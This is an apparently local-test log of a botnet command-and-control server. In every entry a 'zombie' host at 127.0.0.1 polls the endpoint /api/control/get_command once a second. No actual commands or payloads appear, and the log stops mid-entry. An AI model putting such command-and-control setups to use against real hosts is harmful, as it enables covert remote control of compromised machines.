2025-06-24 23:25:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0023s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:25:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:25:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:25:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:25:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:25:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0023s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
